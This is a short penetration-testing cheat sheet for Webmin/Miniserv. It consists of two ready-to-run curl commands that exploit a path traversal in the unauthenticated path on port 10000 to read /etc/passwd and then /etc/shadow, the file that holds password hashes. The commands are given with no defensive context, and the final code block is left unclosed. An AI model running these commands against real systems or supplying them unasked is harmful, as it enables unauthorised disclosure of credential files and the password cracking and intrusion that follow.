# Miniserv and webmin Enumeration

## Test for LFI & file disclosure vulnerability by grabbing /etc/passwd

```ShellSession
curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd
```

## Test to see if webmin is running as root by grabbing /etc/shadow

```ShellSession
curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow
